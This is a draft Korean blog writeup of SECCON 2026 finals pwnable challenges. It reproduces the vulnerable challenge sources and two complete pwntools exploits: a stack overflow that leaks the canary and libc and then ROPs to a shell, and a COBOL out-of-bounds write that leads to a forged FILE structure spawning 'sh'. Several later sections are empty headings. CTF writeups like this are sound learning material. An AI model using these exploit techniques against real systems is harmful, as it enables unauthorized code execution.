---
title: 2026-seccon-pwnable
title_ko: 2026-seccon-pwnable
lang: en
draft: true
date: 2026-03-04
tags:
  - writeup
description: 2026-seccon pwnable challenges writeup
description_ko: 2026-seccon pwnable challenges writeup
---
[lang:ko]
# 서론
나는 2021년 대학교 신입생 시절 CyKor에 들어가며 CTF를 시작했다. 그 당시 언젠가 DEFCON, SECCON, HITCON 본선에 나가야지라는 목표를 세웠고, 3학년 때 HITCON, 4학년 때 DEFCON 본선에 참여할 수 있게 되었지만, SECCON과는 영 인연이 없었다. 이번 SECCON 예선에서도 탈락해서 SECCON은 못 가겠구나라고 생각했는데 운 좋게 TSG CTF에서 1등을 하면서 드디어 SECCON 본선에 출전하게 되었다. 5년만에 이룬 목표인 만큼 이번 SECCON은 다른 대회들보다 더 의미있게 다가왔고, 더 기대하게 되었다.

이번 SECCON에 기대한 부분 중 하나는 AI를 이용한 pay-to-win 을 막는 것이었다. Agentic AI의 등장 이후 많은 CTF 문제들이 "이 문제 풀어줘"와 같은 단순한 프롬프트만으로 풀리는 경우가 빈번하게 발생했고, 이번 SECCON 예선에서도 reversing 문제들이 모두 AI에게 단순한 질문 몇 번으로 풀리는 상황이었어서 본선에서는 이런 일이 발생하지 않을까 걱정했다. 

결론부터 말하자면, 내 걱정은 기우였다. 적어도 내가 담당한 pwnable 분야에서는 인간 개입없이 AI 만으로 풀리는 문제는 없었다. AI는 pwnable 4개 문제에 포함된 취약점을 빠르게 찾는데는 성공했지만, 최종적으로 exploit 하는 것은 어려워 하는 모습을 보였다. 

그럼 지금부터 어떤 문제들이 나왔는지 살펴보자.
# Jeopardy
SECCON 첫번째 날은 Jeopardy 형식으로 대회가 진행되었고, 11:00부터 20:00까지 총 9시간 동안 문제를 풀 수 있었다.

> [!info] 문제 파일은 [여기](https://r3kapig-not1on.notion.site/SECCON-CTF-14-Jeopardy-KOTH-30aec1515fb980299c24f18e2793fc71)에서 다운로드 받을 수 있다.
## scrofa
yudai 의 많은 문제들이 그렇듯이 길지 않은 소스 코드에 흔하지 않은 취약점 혹은 exploit 방법이 숨어있는 문제였다.

전체 코드를 읽어보면, `Write content` 메뉴에서 BOF가 발생한다는 것을 쉽게 알아차릴 수 있다. 하지만 canary 가 활성화 되어 있어, 곧바로 문제를 풀 수는 없다. 이 문제의 핵심은 BOF가 아니라 어떻게 canary, libc 주소 를 구할 것인지 알아내는 것이다.

> [!quote]- scrofa.c
> ```c
> #include <stdio.h>
> #include <string.h>
> #include <stdlib.h>
> #include <unistd.h>
> #include <sys/random.h>
>
> #define SAVE_PREFIX      ("/tmp/save-")
> #define SAVE_PREFIX_LEN  (strlen(SAVE_PREFIX))
> #define SAVE_ID_LEN      16
> #define NOTE_SIZE        0x1000
> #define __STR(x) #x
> #define STR(x)   __STR(x)
>
> typedef struct {
>   char *path;
>   size_t size;
> } save_t;
>
> void note_main(save_t *save) {
>   int choice;
>   char note[NOTE_SIZE];
>
>   memset(note, 0, NOTE_SIZE);
>   printf("(･(oo)･) Scrofa Note\n"
>          " U    U\n"
>          "1. Write content\n"
>          "2. Read content\n"
>          "3. Save note\n"
>          "Savedata ID: %s\n", save->path + SAVE_PREFIX_LEN);
>
>   while (1) {
>     printf("> ");
>     if (scanf("%d%*c", &choice) != 1) {
>       perror("I/O Error");
>       break;
>     }
>
>     switch (choice) {
>       case 1:
>         printf("New content: ");
>         scanf("%[^\n]%*c", note);
>         save->size = strlen(note);
>         break;
>
>       case 2:
>         printf("Content: %s\n", note);
>         break;
>
>       case 3: {
>         FILE *fp = fopen(save->path, "w");
>         if (!fp) {
>           perror(save->path);
>           break;
>         }
>         fwrite(note, sizeof(char), save->size, fp);
>         fclose(fp);
>         puts("Backup done");
>         break;
>       }
>
>       default: return;
>     }
>   }
> }
>
> int main() {
>   char tempname[SAVE_PREFIX_LEN + SAVE_ID_LEN + 1];
>   strcpy(tempname, SAVE_PREFIX);
>   for (size_t i = 0; i < SAVE_ID_LEN; i++)
>     tempname[SAVE_PREFIX_LEN + i] = 'A' + (rand() % 26);
>   tempname[SAVE_PREFIX_LEN + SAVE_ID_LEN] = '\0';
>
>   save_t save = { .path = tempname, .size = 0 };
>   note_main(&save);
>   return 0;
> }
>
> __attribute__((constructor))
> void setup() {
>   int seed;
>   setbuf(stdin, NULL);
>   setbuf(stdout, NULL);
>   setbuf(stderr, NULL);
>   if (getrandom(&seed, sizeof(seed), 0) != sizeof(seed)) {
>     perror("getrandom");
>     exit(1);
>   }
>   srand(seed);
> }
>```

핵심은 BOF를 이용해 `save->path`를 조작하는 것이다. `Save note` 메뉴를 사용할 때, `!fp`면 `perror(save->path)` 를 통해 에러 내용을 출력해주는데, `<argument string>: <error message>`와 같은 형식으로 출력한다. 기존에 stack에 저장되는 `tempname`을 가리키고 있던 `save->path`를 BOF를 이용해 적절히 바꾼다면, canary와 libc 주소를 구할 수 있다.
```c
case 3: {
	FILE *fp = fopen(save->path, "w");
	if (!fp) {
	  perror(save->path);
	  break;
	}
```

대회 중에는 `save->path`의 하위 2byte를 `\x09\x00` 을 바꿔서 그곳에 canary가 있는지 확인하고 있다면, 그 주변에 있는 libc 주소를 가져오고, 마지막으로 BOF를 이용해 ROP하는 방식으로 해결했다. canary를 구할 때 `\x09\x00` 가 실패한다면 다른 후보를 이용해서 재시도하는 방법으로 성공 확률을 올릴 수 있겠지만, 한 개 방법만 시도하는 것으로도 적절한 brute-force 와 함께 풀 수 있어서 더 시도하지는 않았다.

> [!quote]- exploit code
> ```py
> from pwn import *
>
> context.update(
>     arch="amd64",
>     os="linux",
>     terminal=["sudo", "konsole", "-e", "zsh", "-c"]
> )
>
> HOST, PORT = "scrofa.int.seccon.games 5000".split()
>
> e = ELF("scrofa")
> l = ELF("./libc.so.6")
>
>
> def write(content):
>     p.sendlineafter(b"> ", b"1")
>     p.sendlineafter(b"content: ", content)
>
> def read():
>     p.sendlineafter(b"> ", b"2")
>     p.recvuntil(b"Content: ")
>
> def save():
>     p.sendlineafter(b"> ", b"3")
>
>
> def method1():
>     for i in range(0x0, 0x100, 0x8):
>         payload = b""
>         payload = payload.ljust(0x1060, b"A")
>         payload += bytes([i])
>         write(payload)
>         save()
>
>         ret = u64(p.recvn(6) + b"\x00\x00")
>         print(hex(ret))
>         if ret & 0xfff == 0xec6:
>             l.address = ret - 0x1eebc7 - 0x28000
>             log.info("libcbase: %#lx", l.address)
>             return True
>
>         if ret & 0xfff == 0x975:
>             l.address = ret - 0x6b975 - 0x28000
>             log.info("libcbase: %#lx", l.address)
>             return True
>
>         if ret & 0xfff == 0xdae:
>             l.address = ret - 0x85dae - 0x28000
>             log.info("libcbase: %#lx", l.address)
>             return True
>
>     return False
>
> while True:
>     if args.REMOTE:
>         p = remote(HOST, PORT)
>     else:
>         p = process(e.path)
>
>     payload = b""
>     payload = payload.ljust(0x1060, b"A")
>     payload += b"\x09"
>     write(payload)
>     save()
>
>     ret = p.recvn(7)
>
>     print(ret)
>     if all(0x20 <= x and x < 0x7f for x in ret) or len(ret) != 7 or ret[5] == ord(":"):
>         p.close()
>         continue
>
>     canary = u64(b"\x00" + ret)
>     log.info("canary: %#lx", canary)
>
>     if method1() == True:
>         break
>
>     p.interactive()
>
>     # stack = u64(p.recvn(6) + b"\x00\x00")
>     # log.info("stack: %#lx", stack)
>
> payload = b""
> payload = payload.ljust(0x1008, b"A")
> payload += p64(canary)
> payload += b"B" * 8
> payload += p64(l.address + 0x001157bd)
> payload += p64(l.address + 0x001157bc)
> payload += p64(l.search(b"/bin/sh\x00").__next__())
> payload += p64(l.symbols["system"])
> write(payload)
>
> p.sendlineafter(b"> ", b"4")
>
> p.sendline(b"cat flag*")
>
> p.interactive()
> ```

## eChOBOL
COBOL로 작성된 challenge 였다. COBOL 언어는 들어만 봤지 COBOL을 이용해 코드를 작성한 적도, 관련 코드를 읽어본 적도 없어서 일단 LLM 에게 설명을 부탁했다. LLM 은 설명과 함께 빠르게 취약점도 찾아주었다.  

> [!quote]- echo.cbl
> ```cobol
>        IDENTIFICATION DIVISION.
>        PROGRAM-ID. ECHO.
>        AUTHOR. SHIFT-CROPS.
>
>        ENVIRONMENT DIVISION.
>        INPUT-OUTPUT SECTION.
>        FILE-CONTROL.
>
>        DATA DIVISION.
>        WORKING-STORAGE SECTION.
>        01  RET-BYTES-READ          PIC S9(4) COMP.
>        01  INDEX-BUFFER            PIC S9(4) COMP.
>        01  BUFFER-INPUT            PIC X(64).
>        01  BUFFER-TEMP             PIC X(64).
>        01  FLAG-CONTINUE           PIC 9(1) VALUE 1.
>        01  FLAG-INPUT-DONE         PIC 9(1).
>
>        PROCEDURE DIVISION.
>        MAIN-PROCEDURE.
>            DISPLAY "============================================".
>            DISPLAY "  COBOL ECHO SERVICE ".
>            DISPLAY "============================================".
>            DISPLAY " ".
>            DISPLAY "Enter your messages (empty line to exit):".
>
>            PERFORM READ-AND-ECHO-LOOP UNTIL FLAG-CONTINUE = 0.
>
>            DISPLAY " ".
>            DISPLAY "Goodbye!".
>            DISPLAY "============================================".
>
>            STOP RUN.
>
>       *****************************************************************
>       * READ AND ECHO LOOP - Process each message                     *
>       *****************************************************************
>        READ-AND-ECHO-LOOP.
>            MOVE ALL X"00" TO BUFFER-INPUT.
>            MOVE 1 TO INDEX-BUFFER.
>            MOVE 0 TO FLAG-INPUT-DONE.
>
>            DISPLAY "> " WITH NO ADVANCING.
>
>            PERFORM READ-INPUT-LOOP UNTIL FLAG-INPUT-DONE = 1.
>
>       *    Check if first input was just newline (exit condition)
>            IF INDEX-BUFFER = 1
>                MOVE ZERO TO FLAG-CONTINUE
>            ELSE
>                DISPLAY BUFFER-INPUT
>            END-IF.
>
>       *****************************************************************
>       * READ INPUT LOOP - Concatenate input until newline            *
>       *****************************************************************
>        READ-INPUT-LOOP.
>            MOVE ALL X"00" TO BUFFER-TEMP.
>
>       *    Read from stdin into BUFFER-TEMP
>            PERFORM READ-STDIN.
>
>            IF RET-BYTES-READ <= 0
>                MOVE 1 TO FLAG-INPUT-DONE
>            ELSE IF BUFFER-TEMP(1:1) = X"0A"
>                MOVE 1 TO FLAG-INPUT-DONE
>            ELSE
>                MOVE BUFFER-TEMP TO BUFFER-INPUT(INDEX-BUFFER:RET-BYTES-READ)
>
>                ADD RET-BYTES-READ TO INDEX-BUFFER
>                IF INDEX-BUFFER > 63
>                    MOVE 1 TO FLAG-INPUT-DONE
>                END-IF
>            END-IF.
>
>       *****************************************************************
>       * READ-STDIN - Read from standard input                        *
>       *****************************************************************
>        READ-STDIN.
>            CALL "read" USING
>                BY VALUE 0
>                BY REFERENCE BUFFER-TEMP
>                BY VALUE 64
>                RETURNING RET-BYTES-READ
>            END-CALL.
>
>        END PROGRAM ECHO.
>
> ```

> [!quote]- exploit code
> ```py
> from pwn import *
> import time
>
> from sympy import comp
>
> context.update(arch="amd64", os="linux")
>
> BIN_PATH = "./chall"
> HOST = args.HOST or "echobol.int.seccon.games"
> PORT = int(args.PORT or 5000)
>
> e = ELF(BIN_PATH, checksec=False)
> l = ELF("./libc.so.6", checksec=False)
>
> # IDA 기준 오프셋 (PIE여도 둘의 차이는 불변)
>
> ADDR_BUFFER_INPUT = 0x9F40
> ADDR_READ_PTR_GOT = 0x7FE0
> ADDR_BUFFER_INPUT_PTR = 0x84c0
> ADDR_BUFFER_TEMP_PTR = 0x8520
>
> ADDR_BUFFER_INPUT_2 = 0xde30
> ADDR_LIBCLEAK = 0x8d20
>
> def start():
>     if args.REMOTE:
>         return remote(HOST, PORT)
>     return process([e.path], stdin=PIPE, stdout=PIPE, stderr=PIPE)
>
>
> def send_chunk(io, data, pause=1):
>     io.send(data)
>     time.sleep(pause)
>
>
> def comp_s9_4(v):
>     # gcobol PIC S9(4) COMP field encoding matches big-endian 16-bit here.
>     return p16(v & 0xFFFF, endian="big", sign=False)
>
>
> def main():
>     io = start()
>     io.recvuntil(b"> ")
>
>     # Stage 1) 정상 경로로 index=63 만들기 (62 bytes read)
>     send_chunk(io, b"A" * 62)
>
>     # Stage 2) OOB로 index_buffer를 음수로 오염
>     # dest = buffer_input + index - 1 이므로:
>     # index = (target - buffer_input) + 1
>     target_index = (ADDR_BUFFER_TEMP_PTR - ADDR_BUFFER_INPUT) + 1
>     print(hex(target_index))
>
>     payload = bytearray(b"B" * 64)
>     # index=63 시작이므로:
>     # payload[2:4] -> index_buffer, payload[4:6] -> ret_bytes_read
>     payload[2:4] = comp_s9_4(target_index)  # overwrite index_buffer
>     payload[4:6] = comp_s9_4(0)             # overwrite ret_bytes_read
>     send_chunk(io, bytes(payload))
>
>
>     send_chunk(io, b"\x7f\xdf")
>
>     target_index = (ADDR_BUFFER_INPUT_PTR - ADDR_BUFFER_INPUT - 5) + 1
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(target_index)
>     payload += comp_s9_4(2)
>     payload += b"\x30\xde"
>     # pause()
>     # pause()
>     send_chunk(io, payload)
>     send_chunk(io, b"\n")
>
>     e.address = u64(io.recvn(6) + b"\x00\x00") - 0x9ef9
>     log.info("piebase: %#lx", e.address)
>
>     target_index = (ADDR_BUFFER_TEMP_PTR - ADDR_BUFFER_INPUT - 5 + 0xb0) + 1
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(target_index)
>     payload += comp_s9_4(8)
>     payload += p64(e.address + 0x8d20)
>     io.recvuntil(b"> ")
>     send_chunk(io, payload)
>     send_chunk(io, b"\n")
>
>     l.address = u64(io.recvn(6) + b"\x00\x00") - 0x127f90
>     log.info("libcbase: %#lx", l.address)
>
>     target_index = (ADDR_BUFFER_INPUT_PTR - ADDR_LIBCLEAK - 5) + 1
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(target_index)
>     payload += comp_s9_4(8)
>     payload += p64(l.address + 0x2356f0)
>     io.recvuntil(b"> ")
>     send_chunk(io, payload)
>     send_chunk(io, b"\n")
>
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(-0x218 + 0xe0 - 0x38 * 1 + 1)
>     payload += comp_s9_4(8)
>     payload = payload.ljust(0x8, b"\x00")
>
>     payload += p64(0)   # _freeres_list  0xa0
>     payload += p64(0)   # _freeres_buf   0xa8
>     payload += p64(0)   # __pad5         0xb0
>     payload += p32(0)   # _mode
>     payload += b"\x00" * 0x4 # _unused2
>     payload += p64(l.sym["system"])
>     payload += p64(l.address + 0x2354e0 + 0x60)
>     payload += p64(l.address + 0x2332e8 - 0x60) # vtable
>     send_chunk(io, payload)
>
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(-0x218 + 0xe0 - 0x38 * 2 + 1)
>     payload += comp_s9_4(8)
>     payload = payload.ljust(0x8, b"\x00")
>     payload += p32(0)   # _fileno        0x70
>     payload += p32(0)   # _flags2        0x74
>     payload += p64(0)   # _old_offset    0x78
>     payload += p64(0)   # _cur_column / _vtable_offset / _shortbuf
>     payload += p64(l.address + 0x236790)   # _lock
>     payload += p64(0)   # _offset        0x88
>     payload += p64(0)   # _codecvt       0x90
>     payload += p64(l.address + 0x2354e0 - 0x10)   # _wide_data
>     send_chunk(io, payload)
>
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(-0x218 + 0xe0 - 0x38 * 3 + 1)
>     payload += comp_s9_4(8)
>     payload = payload.ljust(0x8, b"\x00")
>     payload += p64(0)   # _IO_buf_base   0x38
>     payload += p64(0)   # _IO_buf_end    0x40
>     payload += p64(0)   # _IO_save_base  0x48
>     payload += p64(0)   # _IO_backup_base 0x50
>     payload += p64(0)   # _IO_save_end   0x58
>     payload += p64(0)   # _markers       0x60
>     payload += p64(0)   # _chain         0x68
>     send_chunk(io, payload)
>
>     payload = b""
>     payload += b"\x00"
>     payload += comp_s9_4(-0x218 + 0xe0 - 0x38 * 4 + 1)
>     payload += comp_s9_4(8)
>     payload = payload.ljust(0x8, b"\x00")
>     payload += b"\x01\x01\x01\x01;sh\x00" # flags
>     payload += p64(0) # _IO_read_ptr
>     payload += p64(0) # _IO_read_end
>     payload += p64(0) # _IO_read_base
>     payload += p64(0) # _IO_write_base
>     payload += p64(1) # _IO_write_ptr
>     payload += p64(0) # _IO_write_end
>
>     send_chunk(io, payload)
>
>     payload = b""
>     payload += b"\x0a"
>     payload += comp_s9_4(1)
>     payload += comp_s9_4(1)
>     send_chunk(io, payload)
>
>     io.interactive()
>
> if __name__ == "__main__":
>     main()
> ```

## lazycry


> [!quote]- lazycry.c
> ```c
> // gcc lazycry.c -lpthread -lcrypto -o lazycry
> #include <stdio.h>
> #include <stdbool.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <pthread.h>
> #include <openssl/aes.h>
> #include <openssl/evp.h>
> #include <openssl/bio.h>
> #include <openssl/buffer.h>
>
> #define SLOT_COUNT 16
> #define MAX_INPUT_SIZE 4096
> #define QUEUE_SIZE 32
>
> struct CryptoBuffer {
> 	size_t size;
> 	char* buf;
> };
>
> struct CryptoThreadArgs {
> 	int slot_id;
> 	struct CryptoBuffer cb;
> 	bool encrypt;
> 	unsigned char* key;
> };
>
> struct TaskQueue {
> 	struct CryptoThreadArgs* tasks[QUEUE_SIZE];
> 	int head;
> 	int tail;
> 	int count;
> 	pthread_mutex_t lock;
> };
>
> struct TaskQueue task_queue;
> pthread_t worker_thread;
> int worker_running = 1;
>
> size_t base64_decode(const char* input, unsigned char* output, size_t max_len);
> void menu_allocate(struct CryptoBuffer* slots[]);
> void menu_set(struct CryptoBuffer* slots[]);
> void menu_show(struct CryptoBuffer* slots[]);
> void menu_free(struct CryptoBuffer* slots[]);
> void menu_crypto(struct CryptoBuffer* slots[], char *key);
> void* crypto_worker(void* arg);
>
> int main(void) {
> 	struct CryptoBuffer* slots[SLOT_COUNT] = {};
>
> 	setvbuf(stdout, NULL, _IONBF, 0);
> 	setvbuf(stdin, NULL, _IONBF, 0);
>
> 	char key_input[256];
> 	printf("Enter base64-encoded key (32 bytes): ");
> 	if (!fgets(key_input, sizeof(key_input), stdin)) {
> 		printf("Failed to read key\n");
> 		return 1;
> 	}
> 	key_input[strcspn(key_input, "\n")] = 0;
>
> 	char key[32];
> 	size_t key_len = base64_decode(key_input, key, 32);
> 	if (key_len != 32) {
> 		printf("Invalid key length (expected 32 bytes, got %zu)\n", key_len);
> 		return 1;
> 	}
>
> 	printf("Key loaded successfully\n");
>
> 	// Initialize task queue
> 	task_queue = (struct TaskQueue){};
> 	pthread_mutex_init(&task_queue.lock, NULL);
>
> 	// Start worker thread
> 	if (pthread_create(&worker_thread, NULL, crypto_worker, NULL) != 0) {
> 		printf("Failed to create worker thread\n");
> 		return 1;
> 	}
>
> 	printf("Worker thread started\n");
>
> 	int choice;
> 	while (1) {
> 		printf("\n=== Lazy Crypto ===\n"
> 		"1. Allocate buffer\n"
> 		"2. Set buffer data\n"
> 		"3. Show buffer\n"
> 		"4. Free buffer\n"
> 		"5. Crypto operation\n"
> 		"0. Exit\n"
> 		"Choice: ");
>
> 		if (scanf("%d%*c", &choice) != 1) {
> 			scanf("%*c");
> 			printf("Invalid input\n");
> 			continue;
> 		}
>
> 		switch (choice) {
> 			case 1:
> 				menu_allocate(slots);
> 				break;
> 			case 2:
> 				menu_set(slots);
> 				break;
> 			case 3:
> 				menu_show(slots);
> 				break;
> 			case 4:
> 				menu_free(slots);
> 				break;
> 			case 5:
> 				menu_crypto(slots, key);
> 				break;
> 			case 0:
> 				printf("Exiting...\n");
> 				worker_running = 0;
> 				pthread_join(worker_thread, NULL);
> 				pthread_mutex_destroy(&task_queue.lock);
> 				return 0;
> 			default:
> 				printf("Invalid choice\n");
> 		}
> 	}
>
> 	return 0;
> }
>
> size_t base64_decode(const char* input, unsigned char* output, size_t max_len) {
> 	BIO *bio, *b64;
> 	size_t len = strlen(input);
>
> 	b64 = BIO_new(BIO_f_base64());
> 	bio = BIO_new_mem_buf(input, len);
> 	bio = BIO_push(b64, bio);
>
> 	BIO_set_flags(bio, BIO_FLAGS_BASE64_NO_NL);
> 	size_t decoded_len = BIO_read(bio, output, max_len);
>
> 	BIO_free_all(bio);
> 	return decoded_len;
> }
>
> int queue_enqueue(struct TaskQueue* q, struct CryptoThreadArgs* task) {
> 	pthread_mutex_lock(&q->lock);
>
> 	if (q->count >= QUEUE_SIZE) {
> 		pthread_mutex_unlock(&q->lock);
> 		return -1;
> 	}
>
> 	q->tasks[q->tail] = task;
> 	q->tail = (q->tail + 1) % QUEUE_SIZE;
> 	q->count++;
>
> 	pthread_mutex_unlock(&q->lock);
> 	return 0;
> }
>
> struct CryptoThreadArgs* queue_dequeue(struct TaskQueue* q) {
> 	pthread_mutex_lock(&q->lock);
>
> 	if (q->count == 0) {
> 		pthread_mutex_unlock(&q->lock);
> 		return NULL;
> 	}
>
> 	struct CryptoThreadArgs* task = q->tasks[q->head];
> 	q->tasks[q->head] = NULL;
> 	q->head = (q->head + 1) % QUEUE_SIZE;
> 	q->count--;
>
> 	pthread_mutex_unlock(&q->lock);
> 	return task;
> }
>
> void process_crypto_task(struct CryptoThreadArgs* args) {
> 	EVP_CIPHER_CTX* ctx;
> 	unsigned char iv[AES_BLOCK_SIZE] = {};
> 	int len;
> 	int total_len = 0;
>
> 	size_t size_copy = args->cb.size;
> 	char* buf_copy = args->cb.buf;
>
> 	unsigned char* temp_buf = malloc(size_copy);
> 	if (!temp_buf) {
> 		printf("Memory allocation failed in crypto worker for slot %d\n", args->slot_id + 1);
> 		free(args);
> 		return;
> 	}
>
> 	ctx = EVP_CIPHER_CTX_new();
> 	if (!ctx) {
> 		printf("Failed to create cipher context for slot %d\n", args->slot_id + 1);
> 		free(args);
> 		free(temp_buf);
> 		return;
> 	}
> 	EVP_CIPHER_CTX_set_padding(ctx, 0);
>
> 	// Perform encryption/decryption
> 	if (args->encrypt) {
> 		EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, args->key, iv);
> 		EVP_EncryptUpdate(ctx, temp_buf, &len, buf_copy, size_copy);
> 		total_len = len;
> 		EVP_EncryptFinal_ex(ctx, temp_buf + len, &len);
> 		total_len += len;
> 	}
> 	else {
> 		EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, args->key, iv);
> 		EVP_DecryptUpdate(ctx, temp_buf, &len, buf_copy, size_copy);
> 		total_len = len;
> 		EVP_DecryptFinal_ex(ctx, temp_buf + len, &len);
> 		total_len += len;
> 	}
>
> 	memcpy(buf_copy, temp_buf, size_copy < total_len ? size_copy : total_len);
> 	free(temp_buf);
>
> 	EVP_CIPHER_CTX_cleanup(ctx);
> 	EVP_CIPHER_CTX_free(ctx);
>
> 	printf("Slot %d: %s completed\n", args->slot_id + 1, args->encrypt ? "Encryption" : "Decryption");
>
> 	free(args);
> }
>
> void* crypto_worker(void* arg) {
> 	(void)arg;
>
> 	while (worker_running) {
> 		struct CryptoThreadArgs* task = queue_dequeue(&task_queue);
>
> 		if (task == NULL) {
> 			usleep(200000);
> 			continue;
> 		}
>
> 		process_crypto_task(task);
> 	}
>
> 	return NULL;
> }
>
> int select_slot(int min, int max) {
> 	int slot;
>
> 	printf("Select slot (%d-%d): ", min, max);
> 	if (scanf("%d%*c", &slot) != 1) {
> 		scanf("%*c");
> 		printf("Invalid input\n");
> 		return -1;
> 	}
>
> 	if (slot < min || slot > max) {
> 		printf("Invalid slot number\n");
> 		return -1;
> 	}
>
> 	return slot - 1;
> }
>
> void menu_allocate(struct CryptoBuffer* slots[]) {
> 	int slot = select_slot(1, SLOT_COUNT);
> 	if (slot < 0) return;
>
> 	if (slots[slot] != NULL) {
> 		printf("Error: Slot already allocated\n");
> 		return;
> 	}
>
> 	size_t size;
> 	printf("Enter buffer size: ");
> 	if (scanf("%zu%*c", &size) != 1) {
> 		scanf("%*c");
> 		printf("Invalid input\n");
> 		return;
> 	}
>
> 	if (size == 0 || size > MAX_INPUT_SIZE) {
> 		printf("Invalid size\n");
> 		return;
> 	}
> 	unsigned block_count = size/AES_BLOCK_SIZE + 1;
>
> 	struct CryptoBuffer* cb = malloc(sizeof(struct CryptoBuffer));
> 	if (!cb) {
> 		printf("Allocation failed\n");
> 		return;
> 	}
>
> 	cb->buf = calloc(block_count, AES_BLOCK_SIZE);
> 	if (!cb->buf) {
> 		free(cb);
> 		printf("Buffer allocation failed\n");
> 		return;
> 	}
>
> 	cb->size = AES_BLOCK_SIZE * block_count;
> 	slots[slot] = cb;
>
> 	printf("Allocated %u blocks at slot %d\n", block_count, slot + 1);
> }
>
> void menu_set(struct CryptoBuffer* slots[]) {
> 	int slot = select_slot(1, SLOT_COUNT);
> 	if (slot < 0) return;
>
> 	if (slots[slot] == NULL) {
> 		printf("Error: Slot not allocated\n");
> 		return;
> 	}
>
> 	struct CryptoBuffer* p = slots[slot];
>
> 	printf("Enter data (%zu bytes): ", p->size);
> 	fflush(stdout);
>
> 	ssize_t bytes_read = read(STDIN_FILENO, p->buf, p->size);
> 	if (bytes_read < 0) {
> 		printf("Read error\n");
> 		return;
> 	}
>
> 	printf("Data set (%zd bytes)\n", bytes_read);
> }
>
> void menu_show(struct CryptoBuffer* slots[]) {
> 	int slot = select_slot(1, SLOT_COUNT);
> 	if (slot < 0) return;
>
> 	if (slots[slot] == NULL) {
> 		printf("Error: Slot not allocated\n");
> 		return;
> 	}
>
> 	struct CryptoBuffer* p = slots[slot];
>
> 	printf("Buffer contents:\n");
> 	write(STDOUT_FILENO, p->buf, p->size);
> }
>
> void menu_free(struct CryptoBuffer* slots[]) {
> 	int slot = select_slot(1, SLOT_COUNT);
> 	if (slot < 0) return;
>
> 	if (slots[slot] == NULL) {
> 		printf("Error: Slot not allocated\n");
> 		return;
> 	}
>
> 	struct CryptoBuffer* p = slots[slot];
>
> 	free(p->buf);
> 	free(p);
> 	slots[slot] = NULL;
>
> 	printf("Slot %d freed\n", slot + 1);
> }
>
> void menu_crypto(struct CryptoBuffer* slots[], char *key) {
> 	int slot = select_slot(1, SLOT_COUNT);
> 	if (slot < 0) return;
>
> 	if (slots[slot] == NULL) {
> 		printf("Error: Slot not allocated\n");
> 		return;
> 	}
>
> 	int operation;
> 	printf("Select operation (1=Encrypt, 2=Decrypt): ");
> 	if (scanf("%d%*c", &operation) != 1) {
> 		scanf("%*c");
> 		printf("Invalid input\n");
> 		return;
> 	}
>
> 	if (operation != 1 && operation != 2) {
> 		printf("Invalid operation\n");
> 		return;
> 	}
>
> 	struct CryptoThreadArgs* args = malloc(sizeof(struct CryptoThreadArgs));
> 	if (!args) {
> 		printf("Failed to allocate thread arguments\n");
> 		return;
> 	}
>
> 	args->slot_id = slot;
> 	args->cb = *slots[slot];
> 	args->encrypt = (operation == 1);
> 	args->key = key;
>
> 	if (queue_enqueue(&task_queue, args) != 0) {
> 		printf("Task queue is full\n");
> 		free(args);
> 		return;
> 	}
>
> 	printf("Crypto operation queued for slot %d\n", slot + 1);
> }
> ```


## comproto

# King Of The Hill


[lang:en]

# English
